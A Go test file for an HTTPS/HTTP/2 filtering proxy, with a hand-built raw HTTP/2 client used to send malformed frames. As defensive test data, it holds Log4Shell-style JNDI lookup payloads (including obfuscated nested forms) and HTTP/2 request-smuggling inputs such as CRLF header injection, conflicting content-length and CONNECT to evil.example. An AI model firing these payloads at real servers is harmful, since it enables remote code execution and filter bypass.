package proxy

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"io"
	"net"
	"net/http"
	"strings"
	"testing"
	"time"
)

// tlsHarness serves the harness's proxy over TLS with HTTP/2 enabled.
type tlsHarness struct {
	*harness
	tlsAddr string
	pool    *x509.CertPool
}

func newTLSHarness(t *testing.T, mutate func(*Config)) *tlsHarness {
	t.Helper()
	h := newHarness(t, mutate)
	certFile, keyFile, pool := selfSigned(t, t.TempDir(), "srv", time.Now().Add(time.Hour))
	tlsCfg, err := NewServerTLS(TLSConfig{CertFile: certFile, KeyFile: keyFile}, nil)
	if err != nil {
		t.Fatal(err)
	}
	srv := NewServer("", h.proxy, ServerConfig{}, nil)
	srv.TLSConfig = tlsCfg
	var lc net.ListenConfig
	ln, err := lc.Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	go func() { _ = srv.Serve(tls.NewListener(ln, tlsCfg)) }()
	t.Cleanup(func() { _ = srv.Close() })
	return &tlsHarness{harness: h, tlsAddr: ln.Addr().String(), pool: pool}
}

func (h *tlsHarness) client(proto string) *http.Client {
	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{RootCAs: h.pool, ServerName: "localhost", MinVersion: tls.VersionTLS12},
		ForceAttemptHTTP2: proto == "h2",
	}
	if proto == "http/1.1" {
		tr.TLSClientConfig.NextProtos = []string{"http/1.1"}
	}
	return &http.Client{Transport: tr, Timeout: 5 * time.Second}
}

// ---- a minimal raw HTTP/2 client, so the tests can send what Go's client refuses to ----

type h2c struct {
	t       *testing.T
	conn    *tls.Conn
	br      *bufio.Reader
	streams map[uint32]*h2result
	closed  bool
}

func (h *tlsHarness) dialH2() *h2c {
	h.t.Helper()
	d := net.Dialer{Timeout: 3 * time.Second}
	raw, err := d.DialContext(context.Background(), "tcp", h.tlsAddr)
	if err != nil {
		h.t.Fatal(err)
	}
	conn := tls.Client(raw, &tls.Config{RootCAs: h.pool, ServerName: "localhost", NextProtos: []string{"h2"}, MinVersion: tls.VersionTLS12})
	_ = conn.SetDeadline(time.Now().Add(8 * time.Second))
	if err := conn.HandshakeContext(context.Background()); err != nil {
		h.t.Fatal(err)
	}
	if conn.ConnectionState().NegotiatedProtocol != "h2" {
		h.t.Fatalf("negotiated %q, want h2", conn.ConnectionState().NegotiatedProtocol)
	}
	h.t.Cleanup(func() { _ = conn.Close() })
	c := &h2c{t: h.t, conn: conn, br: bufio.NewReader(conn)}
	_, _ = io.WriteString(conn, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
	c.frame(4, 0, 0, nil) // empty SETTINGS
	return c
}

func (c *h2c) frame(typ, flags byte, stream uint32, payload []byte) {
	hdr := []byte{byte(len(payload) >> 16), byte(len(payload) >> 8), byte(len(payload)), typ, flags, 0, 0, 0, 0}
	binary.BigEndian.PutUint32(hdr[5:], stream)
	_, _ = c.conn.Write(append(hdr, payload...))
}

// hpack encodes headers as literals without indexing and without Huffman coding.
func hpack(headers [][2]string) []byte {
	out := make([]byte, 0, 64)
	str := func(s string) {
		out = append(out, byte(len(s))) // lengths in these tests are below 127
		out = append(out, s...)
	}
	for _, h := range headers {
		out = append(out, 0x00)
		str(h[0])
		str(h[1])
	}
	return out
}

// request sends a request on the given stream. trailers, if not nil, follow the body.
func (c *h2c) request(stream uint32, headers [][2]string, body []byte, trailers [][2]string) {
	const endStream, endHeaders = 0x1, 0x4
	switch {
	case body == nil && trailers == nil:
		c.frame(1, endHeaders|endStream, stream, hpack(headers))
	case trailers == nil:
		c.frame(1, endHeaders, stream, hpack(headers))
		c.frame(0, endStream, stream, body)
	default:
		c.frame(1, endHeaders, stream, hpack(headers))
		c.frame(0, 0, stream, body)
		c.frame(1, endHeaders|endStream, stream, hpack(trailers))
	}
}

// h2result is what the server did with one stream.
type h2result struct {
	status int // -1 if the response status could not be decoded
	body   string
	rst    bool // the server reset the stream
	goaway bool // the server closed the connection

	sawHeaders, done bool
}

func (c *h2c) result(stream uint32) h2result {
	c.t.Helper()
	if c.streams == nil {
		c.streams = map[uint32]*h2result{}
	}
	for {
		if r := c.streams[stream]; r != nil && r.done {
			return *r
		}
		if c.closed {
			return h2result{goaway: true}
		}
		c.pump()
	}
}

// pump reads one frame and records it against its stream.
func (c *h2c) pump() {
	hdr := make([]byte, 9)
	if _, err := io.ReadFull(c.br, hdr); err != nil {
		c.closed = true
		return
	}
	n := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
	payload := make([]byte, n)
	if _, err := io.ReadFull(c.br, payload); err != nil {
		c.closed = true
		return
	}
	typ, flags, id := hdr[3], hdr[4], binary.BigEndian.Uint32(hdr[5:])&0x7fffffff
	if typ == 4 && flags&1 == 0 {
		c.frame(4, 1, 0, nil) // ack the server's settings
		return
	}
	if typ == 7 {
		c.closed = true
		return
	}
	if id == 0 || (typ != 0 && typ != 1 && typ != 3) {
		return
	}
	r := c.streams[id]
	if r == nil {
		r = &h2result{}
		c.streams[id] = r
	}
	switch typ {
	case 3:
		r.rst, r.done = true, true
	case 1:
		if !r.sawHeaders {
			r.sawHeaders, r.status = true, decodeStatus(payload)
		}
		if flags&1 != 0 {
			r.done = true
		}
	case 0:
		r.body += string(payload)
		if flags&1 != 0 {
			r.done = true
		}
	}
}

func decodeStatus(b []byte) int {
	if len(b) == 0 {
		return -1
	}
	static := map[byte]int{8: 200, 9: 204, 10: 206, 11: 304, 12: 400, 13: 404, 14: 500}
	if b[0]&0x80 != 0 {
		if s, ok := static[b[0]&0x7f]; ok {
			return s
		}
		return -1
	}
	// A literal whose name is one of the ":status" static entries (8 to 14), plain value.
	name := -1
	if b[0]&0xc0 == 0x40 {
		name = int(b[0] & 0x3f)
	} else if b[0]&0xe0 == 0 {
		name = int(b[0] & 0x0f)
	}
	if name >= 8 && name <= 14 {
		if len(b) < 2 || b[1]&0x80 != 0 || int(b[1]) > len(b)-2 {
			return -1
		}
		n := 0
		for _, ch := range b[2 : 2+int(b[1])] {
			n = n*10 + int(ch-'0')
		}
		return n
	}
	return -1
}

func get2(path string, extra ...[2]string) [][2]string {
	h := [][2]string{{":method", "GET"}, {":scheme", "https"}, {":authority", "app.example.com"}, {":path", path}}
	return append(h, extra...)
}

// ---- tests ----

func TestTLSServesHTTP2AndHTTP11(t *testing.T) {
	h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
	for _, proto := range []string{"h2", "http/1.1"} {
		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://"+h.tlsAddr+"/clean?x=1", nil)
		resp, err := h.client(proto).Do(req)
		if err != nil {
			t.Fatalf("%s: %v", proto, err)
		}
		_ = resp.Body.Close()
		want := "HTTP/1.1"
		if proto == "h2" {
			want = "HTTP/2.0"
		}
		if resp.Proto != want || resp.StatusCode != http.StatusOK {
			t.Errorf("%s: proto %s status %d", proto, resp.Proto, resp.StatusCode)
		}
	}
	got := h.up.received()
	if len(got) != 2 {
		t.Fatalf("upstream saw %d requests", len(got))
	}
	for _, s := range got {
		if s.Proto != "HTTP/1.1" || s.RequestURI != "/clean?x=1" || s.Header.Get("X-Forwarded-Proto") != "https" {
			t.Errorf("upstream saw %+v", s)
		}
	}
}

func TestTLSMinimumVersionIsEnforced(t *testing.T) {
	h := newTLSHarness(t, nil)
	d := net.Dialer{Timeout: 3 * time.Second}
	raw, err := d.DialContext(context.Background(), "tcp", h.tlsAddr)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = raw.Close() }()
	conn := tls.Client(raw, &tls.Config{RootCAs: h.pool, ServerName: "localhost", MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS11})
	if err := conn.HandshakeContext(context.Background()); err == nil {
		t.Error("a TLS 1.1 handshake succeeded")
	}
}

// Attacks must be caught whichever HTTP version carried them, and never reach the backend.
func TestHTTP2AttacksAreBlocked(t *testing.T) {
	const a = "${jndi:ldap://x.invalid/a}"
	cases := map[string]struct {
		headers [][2]string
		body    []byte
	}{
		"path":              {get2("/%24%7Bjndi:ldap://x.invalid/a%7D"), nil},
		"query":             {get2("/?q=" + a), nil},
		"header":            {get2("/", [2]string{"user-agent", a}), nil},
		"nested":            {get2("/", [2]string{"x-api-version", "${${lower:j}ndi:${lower:l}dap://x.invalid/a}"}), nil},
		"authority":         {[][2]string{{":method", "GET"}, {":scheme", "https"}, {":authority", a}, {":path", "/"}}, nil},
		"cookie":            {get2("/", [2]string{"cookie", "s=" + a}), nil},
		"body":              {append(get2("/"), [2]string{":method-override", "x"})[:4:4], []byte("q=" + a)},
		"case-folded names": {get2("/", [2]string{"x-forwarded-for", a}), nil},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
			c := h.dialH2()
			hdrs := tc.headers
			if tc.body != nil {
				hdrs = append([][2]string{{":method", "POST"}}, hdrs[1:]...)
				hdrs = append(hdrs, [2]string{"content-type", "application/x-www-form-urlencoded"})
			}
			c.request(1, hdrs, tc.body, nil)
			r := c.result(1)
			if r.status != http.StatusForbidden {
				t.Errorf("result %+v, want 403", r)
			}
			if h.up.count() != 0 {
				t.Errorf("the attack reached the backend")
			}
		})
	}
}

// Things HTTP/2 allows in framing that must not become something different on the
// HTTP/1.1 hop. Either the server refuses them, or what the backend receives is
// exactly what was inspected.
func TestHTTP2DifferentialsDoNotReachTheBackend(t *testing.T) {
	t.Run("crlf in a header value is refused", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, get2("/", [2]string{"x-evil", "a\r\nX-Injected: 1"}), nil, nil)
		if r := c.result(1); r.status == http.StatusOK {
			t.Errorf("accepted: %+v", r)
		}
		for _, s := range h.up.received() {
			if s.Header.Get("X-Injected") != "" {
				t.Error("an injected header reached the backend")
			}
		}
	})
	t.Run("transfer-encoding is not relayed", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, append([][2]string{{":method", "POST"}}, append(get2("/")[1:], [2]string{"transfer-encoding", "chunked"})...), []byte("hello"), nil)
		// Go refuses the header outright; if a future version relayed it, the
		// backend check below would still catch it.
		if r := c.result(1); r.status != http.StatusBadRequest {
			t.Errorf("result %+v, want 400", r)
		}
		for _, s := range h.up.received() {
			if len(s.TE) != 0 || s.Header.Get("Transfer-Encoding") != "" {
				t.Errorf("transfer-encoding reached the backend: %+v", s)
			}
		}
	})
	t.Run("content-length that disagrees with the data is refused", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, append([][2]string{{":method", "POST"}}, append(get2("/")[1:], [2]string{"content-length", "3"})...), []byte("0123456789"), nil)
		if r := c.result(1); !r.rst || h.up.count() != 0 {
			t.Errorf("result %+v, upstream %d: the stream must be reset and nothing forwarded", r, h.up.count())
		}
	})
	t.Run("a Host header that disagrees with :authority is inspected or dropped, never trusted", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, get2("/", [2]string{"host", "${jndi:ldap://x.invalid/a}"}), nil, nil)
		if r := c.result(1); r.status != http.StatusForbidden || h.up.count() != 0 {
			t.Errorf("result %+v, upstream %d: the Host header must be inspected", r, h.up.count())
		}
	})
	t.Run("request targets Go does not turn into a normal path are rejected", func(t *testing.T) {
		for _, path := range []string{"//evil.example/x", "/x#frag", "*", "http://evil.example/x"} {
			h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
			c := h.dialH2()
			c.request(1, get2(path), nil, nil)
			r := c.result(1)
			if r.status == http.StatusOK || h.up.count() != 0 {
				t.Errorf(":path %q: result %+v, upstream %d", path, r, h.up.count())
			}
		}
	})
	t.Run("CONNECT is refused", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, [][2]string{{":method", "CONNECT"}, {":authority", "evil.example:443"}}, nil, nil)
		if r := c.result(1); r.status == http.StatusOK || h.up.count() != 0 {
			t.Errorf("result %+v, upstream %d", r, h.up.count())
		}
	})
	t.Run("trailers are not forwarded", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		hdr := append([][2]string{{":method", "POST"}}, append(get2("/")[1:], [2]string{"te", "trailers"}, [2]string{"trailer", "x-t"})...)
		c.request(1, hdr, []byte("body"), [][2]string{{"x-t", "${jndi:ldap://x.invalid/a}"}})
		if r := c.result(1); r.status != http.StatusOK {
			t.Fatalf("result %+v", r)
		}
		for _, s := range h.up.received() {
			if s.Header.Get("X-T") != "" || strings.Contains(string(s.Body), "jndi") {
				t.Errorf("trailer content reached the backend: %+v", s)
			}
		}
	})
	t.Run("cookie crumbs are joined the same way for inspection and forwarding", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		c.request(1, get2("/", [2]string{"cookie", "a=1"}, [2]string{"cookie", "b=2"}), nil, nil)
		if r := c.result(1); r.status != http.StatusOK {
			t.Fatalf("result %+v", r)
		}
		fwd := h.up.received()[0].Header["Cookie"]
		in := h.inspected()[0]
		var inspected []string
		for _, hd := range in.Headers {
			if hd.Name == "Cookie" {
				inspected = append(inspected, hd.Value)
			}
		}
		if strings.Join(fwd, "|") != strings.Join(inspected, "|") {
			t.Errorf("forwarded %q, inspected %q", fwd, inspected)
		}
	})
	t.Run("many parallel streams stay separate", func(t *testing.T) {
		h := newTLSHarness(t, func(c *Config) { c.Mode = ModeBlock })
		c := h.dialH2()
		for i := uint32(0); i < 5; i++ {
			ua := "ok-" + string(rune('a'+i))
			if i == 2 {
				ua = "${jndi:ldap://x.invalid/a}"
			}
			c.request(1+2*i, get2("/s"+string(rune('0'+i)), [2]string{"user-agent", ua}), nil, nil)
		}
		for i := uint32(0); i < 5; i++ {
			want := http.StatusOK
			if i == 2 {
				want = http.StatusForbidden
			}
			if r := c.result(1 + 2*i); r.status != want {
				t.Errorf("stream %d: %+v, want %d", 1+2*i, r, want)
			}
		}
		if h.up.count() != 4 {
			t.Errorf("upstream saw %d requests, want 4", h.up.count())
		}
	})
}
